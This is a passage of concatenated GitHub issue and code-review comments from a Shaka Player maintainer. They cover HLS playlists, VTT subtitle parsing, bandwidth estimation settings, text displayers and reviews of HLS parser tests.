different.\nAs you might notice, Master playlist has other information like bandwidth and codecs.\nThis is the reason we require it. In order to play your content we must have an estimation for it's bandwidth. We can try to guess the codecs, but knowing it insures we don't make a mistake and successfully play your presentation.\nMedia Playlist itself doesn't have this info.\nIf you know the bandwidth and codecs of your content I can help you create a Master playlist for it!\nHopefully this helps.\nP.S. Could you give us the manifest url just in case you're getting the HLS_MASTER_PLAYLIST_NOT_PROVIDED error by mistake or something? :). @dingconggithub \nGlad that adding the Master playlist helped!\nIt would really help us figure out the problem if you gave us the manifest url. Could you do that? You can send it to shaka-player-issues@google.com if you'd rather share it privately.\nIn the meantime let me bug the smartest person in the room :)\n@TheModMaker could it be the mux.js loading thing or something?. @dingconggithub How are things on your side? Is there anything else we can do for you?. @gabor does that help? Please let us know if there's anything else we can do for you! Otherwise we'll go ahead and close the issue.. We do extract some style info. Shaka Cue has background color, color, font weight, family, style and size properties as well as line height and wrap option.\nCurrently our default text displayer doesn't use this info, so we can certainly work on that.. @michellezhuogg \nDo you happen to know whether mux.js can remuxe mp3 into mp4?\n@joeyparrish \nWould you like me to schedule this?. Hi @shanmugapriyaEK,\nCould you clarify why you wanted all the text track listed at the same time? The way we intended for this to work was that you would choose a language first (selectTextLanguage()) and then select a track from in this language from a track list.\nDo you think you could follow that path?\nI'm pretty sure what you're seeing happens because you go around selectTextLanguage().\nHere's how it works:\nWe have an internal variable that stores current text language. It's set to your preferred text language when the playback starts or to English(I think) by default if no preference has been provided.\nThis variable gets updated when you call selectTextLanguage(). If a different language has been selected, we switch to a new track in the newly selected language.\nBecause you go around this logic when you choose from all the text tracks regardless of language this variable doesn't get updated. When selectAudioLanguage() is called and we refresh the state your current text language is the old language (from before you switched the track), hence we update accordingly.\nWe might be able to work with you to accommodate your use case if there is a reason you can't call selectTextLanguage() first, but I want to check if the intended approach might work for you first.. @shanmugapriyaEK I made the changes to accommodate your use case. It should be working now (in the latest master). We'll add it to the next release.. Hi, thanks for the request. Let's summon The Shaka Mastermind and hear his verdict :)\n@joeyparrish \nIn the meantime, could you please describe the use case for EXT-X-GAP in more detail. Do you have it in LIVE streams or VOD? When and why does this happen?. Hi @albertcsm, thanks for the investigative work you put into this!\n@TheModMaker could I ask you to take a quick look and say whether you think there might be more to this in terms of our gap-jumping logic? If not, I'll be happy to follow the floating-point precision lead.. Hi Giuseppe,\nTry shaka.Player.getStats(). It provides this information and works in uncompiled mode.\n. @Giuscar please let us know if that hepls and whether there's something else we can do for you!. @hdodev how did it go with the packager team? :) Is there anything else we can do for you on this issue?. @joeyparrish Is there something else we should with regards to this issue or are we good to close it?. @TheModMaker could you please review the logic. Nightly. I noticed on the latest master then checked the demo page and nightly build.\nhttps://shaka-player-demo.appspot.com/demo is okay, https://nightly-dot-shaka-player-demo.appspot.com/demo/ isn't.. This is a regression introduced by b7bcafccc27ad836ad6fd12f46bcb101055bc283 - MediaSource is being created before the text displayer is set, which results in not having a text displayer at playback time.. Closing due to inactivity. Please feel free to reopen if there's something else we can do!. @kingctan Does this answer your question? Is there anything else we can do?. Let's get our TL to consider it!\n@joeyparrish . @yairans Did we answer your question? Is there anything else we can do?. @arjen4157 Glad we were able to help, please reach out in the future if something comes up :). @TheModMaker I feel like this one's for you :)\n. Thanks for the PR, @odedhutzler!\n@joeyparrish Joey, I'm assigning this to you since you were the one to discuss the solution.. @odedhutzler sorry for the delay, I will raise the visibility of this with @joeyparrish \nAlso, let me ask our expert on offline to take a look. @TheModMaker, pretty please! :)\nPlease note that we're currently refactoring and redesigning parts of our offline implementation which might affect your PR.. Hi, thanks for reaching out!\nLet me see if I got the question correctly: you want to provide several manifests in different formats describing the same content, is that right? So if one fails another can be retrieved?\nIs there a particular issue you ran into that prompted this question?\nThe thing is, there is no \"right manifest for a browser\" from our perspective. There are file types that are supported by some browsers, but not others (like transport streams are natively supported in Edge, but not Firefox), but it's not strictly related to the manifest extension - HLS(.m3u8), for example, can describe both mp4 content that is natively supported by Firefox&Chrome and ts that's not.\n(Particularly for transport streams, we use mux.js library to transmux them to mp4 so they can be played on any browser).\nI see several directions this conversation can take depending on what your goals are, so if you could provide more details, we can see how best to help.. That's definitely doable from technical perspective :)\nLet's summon Shaka Overlord to see if I'm good to schedule this for the next release! @joeyparrish . Hi @ericmatthys, thanks for the report.\nAny chance you were increasing defaultBandwidthEstimate before the call to player.load()?\nIf that's the case, the new value got overridden by the default value.\n(We can discuss changing that logic, but I want to make sure there isn't a bigger problem here first).\nIf you configure defaultBandwidthEstimate to a higher value after loading the manifest, the abr should respect the new value and choose a higher resolution variant.\nPlease let me know if that's happening for you and then we can discuss further.. Okay, let's see if I understand the issue correctly: when abr is enabled it first starts from the default value that's lower than what your network speed can allow which causes a lower resolution variant to be selected. It gradually catches up, but not soon enough. Is that right?\nIf that's the case, you could try tweaking player.config.abr.switchInterval and player.config.abr.bandwidthUpgradeTarget. Here's the description of what they do from externs/shaka/player.js:\n* @property {number} switchInterval\n *   The minimum amount of time that must pass between switches, in\n *   seconds. This keeps us from changing too often and annoying the user.\n * @property {number} bandwidthUpgradeTarget\n *   The fraction of the estimated bandwidth which we should try to use when\n *   upgrading.\nAbr always starts from the defaultBandwidthEstimate gradually working it's way towards the actual bandwidth. Decreasing switchInterval will allow switches to occur more often thus catching up sooner and increasing bandwidthUpgradeTarget will make jumps more rapid.. @ericmatthys I'm sorry, it seems we've lost track of this issue. :(\nDo I understand correctly that the experience mentioned above was after you set the defaultBandwidthEstimate to a higher value?\n@TheModMaker could I bring you into this? I'm a bit puzzled by why our bandwidth estimate drops initially if defaultBandwidthEstimate has been configured. Do you think we might be doing something wrong?. Thanks, let us know how it goes!. Yes, it's those two cases.\nI think we could split the RESTRICTIONS_CANNOT_BE_MET error into two to distinguish between application and key system restrictions.\nNote: to be able to provide key status for the key system restrictions case we will have to propagate it all the way from parsing key ids in player.js where we set variant.allowedByKeySystem.\nThere is also the case when different variants failed different restrictions (some weren't allowed by an application, some - by key system possibly with different key statuses).\nAlternatively we could log the reason when we see an unmet restriction for a variant. This would require minimal changes to the code, but won't be as effective in communicating the cause of the error to the developers.\n@chrisfillmore would logging work for you?\n@joeyparrish would you schedule this as you see fit?. In that case we could probably start by splitting the error to help you short term and discuss the possible refactoring to make more information about this available further down the road.\nLet me be arrogant and schedule splitting the error for v2.5. If it gets pushed back, you'll know I got in trouble with @joeyparrish ;). Hi @gaxunil, welcome to the community!\nLet me get out in-house gap mastermind @TheModMaker :)\nIn the meantime, could you describe the problem in more detail and ideally provide a way for us to repro the issue. Do you have a manifest we could use for the repro?\nWe have a convenient filing form that asks you all kind of useful questions to help us triage issues quickly and effectively. Here it is:\nWhat version of Shaka Player are you using?:\nCan you reproduce the issue with our latest release version?:\nCan you reproduce the issue with the latest code from master?:\nAre you using the demo app or your own custom app?:\nIf custom app, can you reproduce the issue using our demo app?:\nWhat browser and OS are you using?:\nWhat are the manifest and license server URIs?:\n(NOTE: you can send the URIs to shaka-player-issues@google.com instead, but please use GitHub and the template for the rest)\n(NOTE: a copy of the manifest text or an attached manifest will not be enough to reproduce your issue, and we will ask you to send a URI instead)\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?\nAs I understand, the problem occurs in trick play mode, when rewinding over a gap. What exactly happens? Does rewind stop working? Hangs or something else? Does it happen in the middle of the rewind or after?. Hi!\nJust out of curiosity: what is the use case for such a drastic change in the presentation?\nAs for updating the master playlist: I think this is doable, although it won't be a trivial change to the code.\nWe could include a configuration that will regulate whether or not we update the master playlist.\nThen we will need to:\n- decide whether we can assume we can stop updating the 'old' variants once a master playlist has changed\n- make appropriate changes to the hls parser\n- have the manifest parser change a list of variants and text tracks and communicate the change to the player so UI can be updated\n@joeyparrish is there anything I'm missing?\nIs this something you'd like to put on our road map?. Hi @stanislavche,\nThanks for the report! Please send the manifest link to shaka-player-issues@google.com (reference the issue number in the email - 1371) so we can reproduce and get back to you.. @stanislavche Looks like the stream is encrypted. If that's the case we also need the license server and certificate to be able to access it.. Hi @eladonline, I took a look at your manifest and got an error when trying to display subtitles. I'll look into it later this week.\nThe original problem was that the subtitles didn't display on your custom app, is that right?. Got it. I should have an update for you by the end of the week.. Ok, looks like there is a problem with your subtitle file which prevents us from parsing it.\nHere is the snippet from it:\n3\n00:00:07.000 --> 00:00:09.000\n\u05d4\u05e8\u05d5\u05db\u05d1\u05d9\u05dd \u05d4\u05e4\u05dc\u05de\u05d9\u05dd \n4\n00:00:09.000 --> 00:00:11.000\n5\n00:00:11.000 --> 00:00:13.000\n\u05d8\u05e1\u05d8 \u05e7\u05d5\u05de\u05d9\u05d8\u05d3\nIt's not obvious with the comment formatting, but there are a bunch of newlines between cue 5 and it's payload (about 20 newlines in the actual file :)).\nAccording to the VTT spec cue timimg should be directly followed with one newline character and then the text payload.\nThere is another spot like this in your vtt file: between cue 17 and it's text.\nOnce you fix the content everything should work :). @eladonline glad it worked! Let me asked our TL about supporting these kinds of files.\n@joeyparrish \nTl;dr: apparently some tools used for translating vtt subtitles add more spaces between timing and payload than the spec allows. We can't parse them. Are we willing to modify the VttParser to be able to recover from this?\nFrom code perspective, it's not a gigantic change, but not a small one either since a lot of our logic was built around the assumption that 2 or more new lines indicate a new text cue.. @joeyparrish This one! :)\n@avelad Let me do it :). @Thiagobhmg does that answer your question? Is there anything else we can help you with?. @BucherTomas sorry for the delay, I'll try to have a CL for this out this week or early next one.. Should be working now, let us know if there are any issues.. Hi @Mathieu-R, could you elaborate a bit? Are you interested in the number of segments downloaded? Or number of bytes? (Or something else? :)). Yes! Thanks for the clarification. :)\nWe're not tracking this, but you could create a response filter to do it and register it with the networking engine. Every network response then would go through your filter and you would have access to each segment's byte length.\nIt would look something like this:\njs\nplayer.getNetworkingEngine().registerResponseFilter(function(type, response) {\n   // Only interested in segment requests\n    if (type == shaka.net.NetworkingEngine.RequestType.SEGMENT) {\n     // Get response.data.byteLength\n    }\n  });\nDoes this help?. My pleasure. Please reach out if you need more help.. @sparkyish In terms of us adopting HLS Variant structure, let me also add that while we did change our internal structure to operate on audio+video pairs, for DASH we create all possible combinations, so if you want to switch from playing audio1+video1 to still playing audio1, but with video2 instead there is going to be an audio1+video2 variant!\n(Let me know if that explanation was unclear, I'll give more detail and examples).\nSo, while the switch to variants makes operating with DASH less intuitive, you should still be able to get the behavior you want.\nIs that helpful? I'm not entirely sure, but it sounded like you were ultimately interested in switching video without changing audio. If that's the case we can provide guidance on how to accomplish that in the new variant world.. @sparkyish yup, your idea is correct, I was going to suggest something along these lines.\nYou can use player.getManifest() to get the manifest object.\nmanifest.periods[i].variants will give you all the variants for a given period.\nindividual streams can be accessed by variant.video and variant.audio.\nYou will need to keep track of the stream ids when you show the adaptations to the users, so you can later map their choices to the the streams and variants.\nSorry, I know this is way more complicated than it used to be when we only had DASH support, but it was the most meaningful way for us to add support for HLS.\nLet us know if you run into complications, I'll help with the code and debug with you if need be :)\n. @frhi Glad we could help! Please reach out in the future if you need anything :). @chrisfillmore thanks for the idea!\n@joeyparrish is this something we're interested in working on? I'm adding the issue to backlog for now.. @chrisfillmore Thanks for replying! LOL, If you're ever looking for a job, give a word, I'll personally refer you ;)\n@sergioavazquez \nLet us know how it goes after including mux.js!. Hi @PrasannaLearnyst, thanks for reporting!\nEXT-X-ENDLIST tag is a Media playlist tag and should not be part of the Master Playlist, so removing it is the right thing to do.\nRegarding the playback getting stuck after 2 seconds, it looks the third segment somehow gets stuck in transmuxing and thus hangs the playback. \nI tried it in Edge (as an example of a browser that has native support for ts) and it works.\n@michellezhuogg could you advise on transmuxing, please?. I don't think anything's wrong with the content. The notes I left are for other members of my team, so if someone other than me picks this up, they know what's already been done.\nI think the problem is either on mux.js side (the open source library we use for transmuxing) or in our integration with them. We will investigate further and reach out to mux.js developers if need be.. @PrasannaLearnyst from their explanation, it sounds like the segment states that it has both audio and video, but in fact has only video.\nCould you follow up on this with your encoder? (Feel free to join the discussion on the mux.js bug if they introduce new info).\nMux.js devs have given us a hint on how to work around the problem, but it does sound like the content's description of itself is incorrect (based on the info we get from mux.js, unfortunately I'm not an expert on ts).. @PrasannaLearnyst For some reason I have a feeling I've seen a comment from you saying that you checked and was audio in the segment in question after all. Am I imagining things? \n(Apologies if I'm confused, but that's a whole different direction of the conversation with mux.js if that's the case).. The code I have submitted is to make sure we throw an error in this case instead of hanging.\nAs for fixing the problem, @joeyparrish, could you give an update on what direction we want to go with this?. Reproed.\nI also noticed that:\n1) There is a gap jump at the very beginning\n2) If I scroll to 0.01 (or further) it starts playing/\n@TheModMaker, do you think the gap jump might be related? (Or @theodab :) I forgot which one of you worked on small gaps at the start of the content recently).. Hi @ravics78,\nCan you repro it in any other browser? I don't seem to get the assertion in either Chrome or Firefox.. Hi! No question is stupid :)\nHere is how it works:\nThere is a Player class, which is like a big all-encompassing overlord that rules everything (see the architecture diagram here). It has members responsible for different aspects of playback: ManifestParser takes care of the manifest, AbrManager is responsible for adapting to network conditions and so on... TextDisplayer is in charge of displaying subtitles.\nPlayer.setTextTrackVisibility exists for a couple of reasons:\n1) The code that gets invoked when a user presses the captions button doesn't (and shouldn't) know about TextDisplayer. For all it is concerned, the player somehow magically enables and disables subtitles when the button is pressed. Player.setTextTrackVisibility will in turn call textDisplayer.setTextVisibility on your custom displayer. TextDisplayer.setTextVisibility is the method that's actually hiding subtitles. In our default implementation, we're working with TextTrack class, so SimpleTextDisplayer is setting TextTrack's mode. If your application is doing it differently, this is where you will take care of it. Player.setTextTrackVisibility will not work with text visibility directly, but will call textDisplayer.setTextVisibility to do it.\n2) Player.setTextTrackVisibility is doing some extra related work that's not strictly text visibility. For example, if text is no longer visible, we stop streaming it to save bandwidth.\nBottom line: you don't need to call player methods from your custom displayer, but you do need to take care of showing and hiding subtitles!\nPlease let me know if this wasn't clear or if you have any other questions!. Glad to help! Please reach out in the future if you have more questions :). Hi @desenhista, I'm getting a 403 error for your manifest. Are you restricting access by region or something like that?. @michellezhuogg @joeyparrish \nCould one of you take this over is this/next week's bug cop?. @joeyparrish Could you take a look if you have a chance? (The mentioned commit is yours and I don't have access to IE today). If not, I'll check this out later this week.. @joeyparrish Boy, am I glad I asked you \ud83d\ude1b . Hi @nickrobinson,\nWe will need to repro to better understand the problem. From what you're describing I suspect that specifying HLS parser might have worked, but then the parser got confused with the extension of your segments.\nThat's just my idle speculations though. Please post the manifest url here or send it to shaka-player-issues@google.com.. Hi @philippk80,\nCould you describe your use case in more detail?\nYou want to take a VOD dash manifest and only make 1 stream available per content type (only one video, one audio and one text regardless of user's network speed, language preference etc.). Is that right?\nDoes the manifest itself have multiple renditions (many video/audio versions)?. @joeyparrish I feel like you might be able to give better advice on the general technical direction of the project in question.. @kchandran1029 \nWe work with browsers through Media Source API which all the modern browsers (in theory) implement.\nIn practice, Safari has its' own implementation for transport stream support and Apple has not been very cooperative in fixing their Media Source implementation.\nThe problems in Safari are likely not your fault, but bugs in the browser.\nWe have a plan to use Safari's native support for HLS, you can track the progress here: https://github.com/google/shaka-player/issues/997. Hi @parmendratyagi. The UI we have at the moment is just there to help demo the player library functionality. We did not intend it to be used by applications.\nHowever, we are planning to launch a Shaka UI library to compliment the player that is intended for the applications, and it is going to include a quality control.\nWe hope to to launch the UI library later this year (August or September).\nLet me know if you have any questions.. @sridhard It is a private branch at the moment. We will make it publicly available when we release v1.. Are you a part of shaka-player-users@googlegroups.com? (Another way to ask this would be \"Do you get our release announcements?\"). Given you have some dort of a google account:\nGo to https://groups.google.com/forum/#!forum/shaka-player-users, sign into your account if you aren't already, there should be a (blue) \"join\" button.. Thank you for you kind words @bansalvks, greatly appreciated!\nWe are working on #816, which is a stepping stone for #382.\n@vaage, do you think you could give an update in terms how much more time/effort is needed?. Confirmed that the video is playable in both Firefox and Chrome with the mentioned flags. Marking issue as external.. @chrisfillmore We should, probably, rename them to preferences or something.\n@joeyparrish, please correct me, if I'm wrong (I was not actively involved with this change), but, to the best my knowledge, the idea is that:\n- top-level restrictions mean \"we can/shall not play the variants that don't comply with the restrictrictions, treat them like they don't exist\"\n- abr restrictions (in the new world, the ones that I think should be called preferences) mean \"we can/shall play these, but we'd rather not. If there is any other variant we can play instead, let's do it; if not, so be it\".\nThe data savers thing references in the commit msg is basically \"if the data saving mode is on, make every attempt to play lower bandwidth video before going for higher res and wasting precious data\".. Thanks a lot for letting us know! Yes, we are using mux.js.\n@michellezhuogg could you please take a look, see what the impact is going to be for us?\n@joeyparrish FYI. @joeyparrish could you please schedule this and/or advise on a workaround if need be. @sandeep-mirpuri @chrisfillmore \nI'll try to talk our TL @joeyparrish in person about this and see if he's open to a conversation in that direction.. Hi, I'm having trouble getting the content (the player seems to thing the segments are not there). Was it a live stream, by any chance? Could you confirm it's still available?\nThanks!. Hi, we'd love to make the tutorial better! Could you explain a bit more what was unclear? The default values for the config? The reasons behind them? The concept of network fallback as a whole?. Thanks for giving us feedback on the tutorials! Let me schedule this for 2.5.. Hi, thanks for reaching out.\nHaving config be the source of truth might mean we're no longer compliant with the dash spec, but let me see if our TL is open to a discussion on this @joeyparrish . Summoning the dash expert.\n@TheModMaker could you please comment.. @joeyparrish should this be a part of the UI lib docs instead?. Hi @cdgriffith, thanks for reaching out!\nCould you give us the link to your manifest and subtitles, so we can repro?\n(You can send them privately to shaka-player-issues@google.com, if you'd like)\nI have a couple of theories on what might be going on, but want to check with your content, if possible.. Thanks for the content!\nThe player seems to think the list of text cues id empty. I'll investigate.\nAs an aside (for the team), we don't communicate the text streams' information to the native controls. As a result, any content with subtitles, regardless how many tracks, results in a single \"Shaka embedded track\" entry. We should consider explicitly adding track objects to the video element, so they're accessible to native controls users.. Okay, the latest master should be good now.\nI noticed that you're using Chrome's native media controls.\nPlease note that although subtitles will be displayed when captions button is pressed, the native UI will still say \"Shaka Embedded track\". That's because we don't pass tracks info to the native controls. We probably should, but at this point I'm not sure how much work is needed to accomplish that, so more research is needed.. FYI, we are currently working on a UI layer for the player, that will allow for text track selection from the UI, listing all the text tracks available.. Hi Vikas, for the skipping 10 seconds part, I'm pretty sure it's our default manifest configuration in play.\nApple's tools package their hls content with a 10 seconds presentation delay (don't ask why :)), so we made it a default, assuming that most of the content our there is being packaged with Apple's tool.\nLooks like your content was not :)\nPlease try calling player.configure('manifest.defaultPresentationDelay', 0); before the load call, I think, it should fix it.. Ahh, I was so sure, that was it :)\nSorry for the random guess, I'll do a proper investigation tomorrow.. Okay, so it seems like we're parsing the 10 seconds offset from the content itself.\nThis might be a problem with our parser, though, especially given that hls.js is able to do it right.\nThe bad news is, I'll have to consult the person who wrote the ts parser, who will be back from vacation in a week.\nThe good new is, I'm assigning the issue to him and have just put a big pink sticky note on his monitor, asking him to look at the issue, so there is no way he misses it.\nSorry it's taking longer!. @joeyparrish could you please check if our parser is doing something wrong, once you're back. Aww, I've never been compared to a superhero before :blush: . Thank you @TheModMaker, I should've known to ask you!\nOn the down side, I'll have to take the sticky note off Joey's monitor now.. @tylerdaines Definitely! Thanks for the ping and apologies for the delay.\n@TheModMaker @vaage Guys, could I ask you to take a look since you both worked on the #1010 . @TobbeEdgeware Glad to hear! Does this mean we can close the issue, or is there something else we can help with?. Hi @BlessingD \nCould you post a snippet of your code when you're creating a new shaka.Player object?\nAre you calling Player.attach() anywhere?. We really need to see your code to help identify the problem.\nIn the mean time, if you haven't already, please take a look at our basic usage tutorial and see if that helps.. Case closed! Congrats to the attentive detectives :). Hi! Please take a look at our Offline Storage and Playback tutorial.\nIf you have any follow up questions, let us know, we'd be happy to continue the discussion!. Ah, got it.\nThe UI(controls) you have on the screenshot is Chrome native controls. You're getting them cause you have specified \"controls\" on the video element. They are coming from the browser (if you open the same thing in another browser like Firefox or IE, the controls will look differently). We have no control over it.\nWe are, however, about to release a UI layer which will be able to take care of this for you. It doesn't have a download button yet, but it's on our roadmap.\nPlease join our announcement list to get updates on that.\n. As I mentioned, we don't currently have a UI layer at all! If you'd like to write one, you can use https://github.com/google/shaka-player/blob/master/demo/common/controls.js as an example.. Hi! I'm having trouble understanding your use case. Could you help me out?\nAre the chapters represented in the manifest in any way (like one DASH period per chapter or something like that?). I created #1724 to track progress on pip experience on Opera.\n@beaufortfrancois could you add updates to it as your conversation with the Opera folks progresses?. Ok, everything looks good! Please revert the year on the externs file, and you're good to go!. Cool, let me do a test pass.. Thank for the PR, Fran\u00e7ois!. Hi, \nTo the best of our knowledge, the comment you reference is still applicable.. Awesome, thanks for following up, @beaufortfrancois . Looks like we are treating uri attribute of the media tag as required, which is wrong unless the tag describes subtitles.\nFrom the HLS spec:\n\nThe URI attribute of the EXT-X-MEDIA tag is REQUIRED if the media\n   type is SUBTITLES, but OPTIONAL if the media type is VIDEO or AUDIO.\n   If the media type is VIDEO or AUDIO, a missing URI attribute\n   indicates that the media data for this Rendition is included in the\n   Media Playlist of any EXT-X-STREAM-INF tag referencing this\n   EXT-X-MEDIA tag.  If the media TYPE is AUDIO and the URI attribute is\n   missing, clients MUST assume that the audio data for this Rendition\n   is present in every video Rendition specified by the EXT-X-STREAM-INF\n   tag.\n\nThanks for the report, we will work on it.. @rgc feel free to use master.. @rgc Sorry, this completely escaped my attention :( Thanks a lot for the reminder! Let me run the tests.. URI attribute should only be required on subtitles, according to the spec.\nIssue #1080\nIssue #1730 . Thanks again for the PR and sorry it got delayed cause of the holidays!. Hi @Kogoruhn,\nshaka.extern.PlayerConfiguration does not have a clearBuffer field. \nCould you walk me through the use case for this? Is it that playback stalls for a sec while we're buffering the new resolution?\n. Oh, are you proposing we add a clearBuffer config?\nSorry, I'm slow today :)\nIt would make more sense to be part of the UI config, but can certainly do it if that was the suggestion.. Gotcha!\nSpasibo, we'll work on it.. This is a bug from the Chromecast team. Reopening, as it is still ongoing. We're in communication with them via email.. Hi @salmoro \nI'm having trouble with the repro. Do you see this on our demo page or the nightly build? Do the links have the correct asset? (It shouldn't matter, but still).. Yes! Please send it to shaka-player-issues@google.com (mention the issue # in the subject) and we'll take a look.\nPlease note that for protected content we will need drm information.. Thanks for the report! Let me get the local closed caption expert.\n@michellezhuogg, can you take a look?\nTo the best of my knowledge, we only have support for CEA in terms of closed captions (Michelle, am I right?), so we're likely unable to detect them. (We just landed CEA support, like a month ago :) ) We'll take a look at the CEA stream, though!. Thanks for the fiddle! Are those embedded (CC) TTML and VTT? As I mentioned above, for closed captions we only have CEA support at the moment.. @kevinscroggins-youi Did you mean full release? 2.5.0-beta includes all the features!\nIf what you meant was 2.5.0 (not beta, full release) then, hopefully, some time in Feb! We're a bit behind on it :(. Hi @rameshnavi \nGlad to see people try the UI!\nOne thing I spotted right away - you're missing letter 'f' in \"fast_forward\" :)\nNot sure what happened with fullscreen yet. Will investigate!. @vaage Thanks for investigating! I'll look into it.. Found the culprit. The fix is coming! . Fix checked into the latest master.. Looks good! Let me run the tests.. Merged! Thanks for the contribution!. @theodab I think you caught it, and I forgot to change it :(. Merged! Thanks for the contribution!. Hi @skipness, thanks for reporting.\nFirstly, do you think you're able to provide us the manifest for for the repro?\nFeel free to send it privately to shaka-player-issues@google.com. It's really hard for us to diagnose problems without a clear repro.\nSecondly, unfortunately, we don't have a Tizen 4 to test on, and our mastermind @joeyparrish says we're not getting one anytime soon :(\nJoey, do you think, there's any way around this?\nEither way, I'll leave the issue open for now in case someone outside the team is able to provide some insight.\nSorry :(. Hi @tomaas-zeman, thanks for reporting!\nFirst of all, it's really hard for us to diagnose an issue with no url provided for the repro.\nPlease feel free to send it privately to shaka-player-issues@google.com\nEducated guess from looking at your report: we recently merged a PR for extracting playready drm info from the manifest. I think, this might be the reason it tries to acquire a play ready license.\nIf this is the case, the advice @bcupac gave you (thanks for responding btw :) ) should be able to do the trick as it will tell the player to ignore the extracted info.\nLet us know how it goes!\n. Let's just pass a useRelativeCueTimestamps boolean down instead of the whole config structure. This means we won't be able to update it, but given the nature of the setting this should be fine.\n. \"?\" in front of the type means \"nullable\". E. g. segmentEndTime could be a number, or it could be null. Notice, how the offset is just {number}, meaning we always expect it to be a number, passing null won't compile.\nIn case of useRelativeCueTimestamps, it always should be either true or false, which means we don't need the \"?\" before \"boolean\". Same stands for all the other places where it is declared.\n. It's less confusing if you pass the value of useRelativeCueTimestamps, the other parsers can ignore it.\n. Drop \"?\" and add a comment that useRelativeCueTimestamps is only used by the VTT parser.\n. Use bool useRelativeCueTimestamps\n. Drop \"?\" and add a comment that useRelativeCueTimestamps is only used by the VTT parser.\n. Nice catch :)\n. use false, here and in the other tests\n. Let's also add a new test \"uses relative time stamps if configured to\" which will pass \"true\" to the vtt parser and check that the start/end time of the cues is now relative.\n. let's call it \"textAlignToLineAlign_\" instead so it's clear what we are mapping.\n. Let's merge this test and a previous one into a single it('parses cue alignment from textAlign attribute') with two calls to verifyHelper inside it. (The same way 'disregards empty divs and ps' does 3 calls).\n. Sorry, Jonas, I missed this when I reviewed: what is the rationale between setting position if textAlign is center?\nI might have to roll this back for now because it messes with Safari and Firefox tests (these browsers don't support 'auto' value for VTTCue.position), but I can totally address this and reintroduce setting position if there's a valid reason to.\n. Got you. Let me file some bugs :)\nDo I understand the problem with Chrome correctly: cue.align = 'center' is not supported and setting cue.align = 'middle' does not result in text being positioned in the middle of the cue box?\n. Done! (And fixed the tests) \nLinks to the bugs for references:\nhttp://crbug.com/663797\nhttps://bugzilla.mozilla.org/1316134\n. A dev from Chrome got back to me asking for a vtt sample got the 'middle' bug. They're about to change it to 'center', but are having hard time reproducing the case where it doesn't position text in the center. Do you think you could share a sample that has the problem?\nYou can email it to me at ismena@google.com\n. Let's rephrase to something like \"Replaces  tags with /m characters\"\n. {!Element} for consistency (instead of Node)\n. Any advantages to \"!==\" operator over \"childNodes.length > 0\" here?\n. Let's merge this test and a previous one into a single \"it('replaces  tags with newline characters')\" with 2 calls to verifyHelper in it.\n(Like in 'disregards empty divs and ps' above which has 3 calls).\n. Got it. I believe you're right and that might be the intended behavior (cue.position governs the position of the cue itself while align is about positioning the text inside the cue).\nThanks. I'll work with the Chrome team on fixing the align='center' issue.\n. The build failed? Ok, please leave a TODO above the param declaration (line 212) that having param Element here gives build problems and I'll look at it when we merge the PR.\n. Yup, please change.\n. I'm a little lost here. Did something change in terms of logic on lines 335-351?\nI suspect you might be working off an older version of the file (we refactored it a bit since your last commit). If that's the case, let's stick to the newer version.\nLooks good otherwise.\n. Oh, I see. In that case we are good to go.\n. Try iterating over .children instead of .childNodes\n(The credit for the idea goes to @TheModMaker :))\n. Thanks for the PR! Small nit: we generally avoid using '===' operator in the project unless there's a good reason to have it instead of just '=='.\n. Nitpick: please change to video STREAM id (instead of track).\nA track is a representation of a variant or text stream, so technically we don't have video/audio tracks.\nSame for audio below. The rest of the CL looks good to me.. Please change the names to pauseDownloadButton/resumeDownloadButton or similar (I assume that's what they do, right?). pause/resume button sounds like it's pausing/resuming the video.. You don't have to specify return type if it's void.. 1) rename to this.uris\n2) should the variable hold anything at this point? If it doesn't have a value yet, use this.uris = [].. Same. If there is no value yet, initialize to null.. We typically prefer '==/!=' to '!==/===' unless there is a good reason to use the latter.\n(Here and below). Same. Please initialize to null if no value yet.. use 'let' instead of 'var'. For the reason that I don't fully understand, we're not allowed to ever update the year :/. @theodab You're probably right about hiding the pip button when casting, I don't think it makes sense in that context. I'll work on that once this PR lands.\n@beaufortfrancois Thanks for the PR! Let me play around a bit with it locally to better understand what's going on with events on this.video_ and get back to you.. This should not apply to type 'SUBTITLES' as those are not valid without a uri:\n```\n    const type = HlsParser.getRequiredAttributeValue_(tag, 'TYPE');\n   // Do not create stream info from closed captions media tags, which are\n   // embedded in video streams.\n   mediaTags = mediaTags.filter((tag) => {\n    return type != 'CLOSED-CAPTIONS';\n  });\n// AUDIO or VIDEO tags without a URI attribute are valid.\n // If there is no uri, it means that audio/video is embedded in the\n // stream described by the Variant tag.\n // Don't create streams for AUDIO and VIDEO tags with no URI.\n  mediaTags = mediaTags.filter((tag) => {\n    const uri = tag.getAttributeValue('URI') || '';\n    return type == 'SUBTITLES' || uri != ''\";\n. Nitpick: Please change the group id to something more subtitle-appropriate :)\nHaving subtitle tag with id \"vid\" is weird.. Please add tests (somewhere around line 428) to make sure the \"ignore uri for audio and video tags\" behavior is working:\n it('allows video media tags without uri', async () => {\n           const master = [\n          '#EXTM3U\\n',\n          '#EXT-X-STREAM-INF:CODECS=\"avc1,mp4a\",BANDWIDTH=200,',\n          'RESOLUTION=960x540,FRAME-RATE=60,VIDEO=\"vid\"\\n',\n          'audio\\n',\n          '#EXT-X-MEDIA:TYPE=VIDEO,GROUP-ID=\"vid\"',\n        ].join('');\nconst media = [\n  '#EXTM3U\\n',\n  '#EXT-X-PLAYLIST-TYPE:VOD\\n',\n  '#EXT-X-MAP:URI=\"init.mp4\",BYTERANGE=\"616@0\"\\n',\n  '#EXTINF:5,\\n',\n  '#EXT-X-BYTERANGE:121090@616\\n',\n  'main.mp4',\n].join('');\n\nlet manifest = new shaka.test.ManifestGenerator()\n        .anyTimeline()\n        .addPeriod(0)\n          .addPartialVariant()\n            .addPartialStream(ContentType.AUDIO)\n              .mime('audio/mp4', 'mp4a')\n      .build();\n\nawait testHlsParser(master, media, manifest);\n\n});\nit('allows audio media tags without uri', async () => {\n           const master = [\n          '#EXTM3U\\n',\n          '#EXT-X-STREAM-INF:CODECS=\"avc1,mp4a\",BANDWIDTH=200,',\n          'RESOLUTION=960x540,FRAME-RATE=60,VIDEO=\"vid\"\\n',\n          'video\\n',\n          '#EXT-X-MEDIA:TYPE=AUDIO,GROUP-ID=\"aud\"',\n        ].join('');\nconst media = [\n  '#EXTM3U\\n',\n  '#EXT-X-PLAYLIST-TYPE:VOD\\n',\n  '#EXT-X-MAP:URI=\"init.mp4\",BYTERANGE=\"616@0\"\\n',\n  '#EXTINF:5,\\n',\n  